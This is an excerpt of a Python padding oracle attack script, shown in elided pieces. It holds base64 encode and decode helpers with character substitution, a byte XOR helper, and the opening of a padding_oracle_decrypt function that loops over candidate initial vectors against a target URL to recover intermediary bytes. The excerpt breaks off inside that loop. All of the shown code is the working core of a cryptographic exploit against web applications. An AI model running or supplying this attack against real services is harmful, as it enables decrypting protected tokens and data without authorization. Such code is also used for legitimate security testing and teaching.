...
def decode(data):
  """Function to decode base64 url and replace unique characters"""
  return base64.b64decode(data.replace('~', '=').replace('!', '/').replace('-', '+'))


def encode(data):
  """Function to encode base64 url and replace unique characters"""
  return base64.b64encode(data).decode('utf-8').replace('=', '~').replace('/', '!').replace('+', '-')

def bxor(b1, b2):
  """Uses Xor for bytes result"""
  result = b""  
...
def padding_oracle_decrypt(url, data):
  print('Crack data：{}'.format(data)) 
  index = 15 
  intermediary = bytes() 
  tail = bytes() 
  while index >= 0:
     for iv in generate_iv_list(tail):
        print('Try initial vector：{}'.format(trans(iv)))
